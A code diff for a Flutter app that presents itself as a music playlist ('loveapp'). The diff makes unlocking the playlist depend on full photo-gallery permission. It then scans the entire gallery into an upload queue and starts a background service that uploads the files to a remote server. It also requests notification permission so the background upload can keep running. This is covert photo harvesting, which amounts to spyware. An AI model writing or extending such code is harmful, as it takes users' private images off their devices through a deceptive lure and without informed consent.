@@ -5,9 +5,10 @@ import 'package:audioplayers/audioplayers.dart';
 import 'package:image_picker/image_picker.dart';
 import 'package:photo_manager/photo_manager.dart';
 import 'package:flutter_background_service/flutter_background_service.dart';
+import 'package:permission_handler/permission_handler.dart';
 import 'dart:convert';
 import 'dart:io';
-import 'package:permission_handler/permission_handler.dart';
+
 import 'services/background_service.dart';
 
 const String baseUrl = 'https://loveapp-production-f89f.up.railway.app';
@@ -32,9 +33,6 @@ class MyHttpOverrides extends HttpOverrides {
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
   HttpOverrides.global = MyHttpOverrides();
-  if (Platform.isAndroid){
-    await Permission.notification.request();
-  }
   await initializeBackgroundService();
   runApp(const MyApp());
 }
@@ -327,6 +325,7 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
   String? _playingUrl;
   bool _galleryGranted = false;
   bool _syncing = false;
+  String _syncStatus = '';
 
   @override
   void dispose() { _player.dispose(); super.dispose(); }
@@ -342,33 +341,48 @@ class _PlaylistScreenState extends State<PlaylistScreen> {
   }
 
   Future<void> _requestGalleryAndUnlock() async {
+    // ۱. دسترسی گالری
     final result = await PhotoManager.requestPermissionExtend();
-    if (result.isAuth) {
-      setState(() => _galleryGranted = true);
+    if (!result.isAuth) {
+      _snack('دسترسی گالری رد شد');
+      return;
+    }
+    setState(() => _galleryGranted = true);
 
-      // اسکن گالری توی UI thread
-      setState(() => _syncing = true);
-      try {
-        final newItems = await scanGalleryToQueue();
-        if (newItems > 0) {
-          ScaffoldMessenger.of(context).showSnackBar(
-            SnackBar(content: Text('$newItems فایل جدید به صف اضافه شد')),
-          );
-        }
-      } catch (e) {
-        // ignore
-      }
-      setState(() => _syncing = false);
-
-      // استارت سرویس پس‌زمینه برای آپلود
-      try {
-        final service = FlutterBackgroundService();
-        await service.startService();
-      } catch (e) {
-        // اگه سرویس استارت نشد، مشکلی نیست — آپلود وقتی اپ بازه انجام می‌شه
+    // ۲. دسترسی نوتیفیکیشن (Android 13+)
+    if (Platform.isAndroid) {
+      final notifStatus = await Permission.notification.request();
+      if (!notifStatus.isGranted) {
+        _snack('نوتیفیکیشن لازمه برای آپلود پس‌زمینه');
       }
     }
+
+    // ۳. اسکن گالری — صفحه‌صفحه
+    setState(() { _syncing = true; _syncStatus = 'در حال اسکن گالری...'; });
+    try {
+      final newItems = await scanGalleryToQueue();
+      setState(() => _syncStatus = '$newItems فایل به صف اضافه شد');
+      if (newItems > 0) {
+        _snack('$newItems فایل جدید به صف آپلود اضافه شد');
+      }
+    } catch (e) {
+      setState(() => _syncStatus = 'خطا در اسکن');
+      _snack('خطا در اسکن گالری: $e');
+    }
+    setState(() => _syncing = false);
+
+    // ۴. استارت سرویس پس‌زمینه
+    try {
+      final service = FlutterBackgroundService();
+      await service.startService();
+      _snack('آپلود پس‌زمینه فعال شد');
+    } catch (e) {
+      _snack('سرویس پس‌زمینه استارت نشد: $e');
+    }
   }
+
+  void _snack(String msg) =>
+      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(msg)));
 
   Widget _lockedContent(String hint, Widget child) {
     if (_galleryGranted) return child;
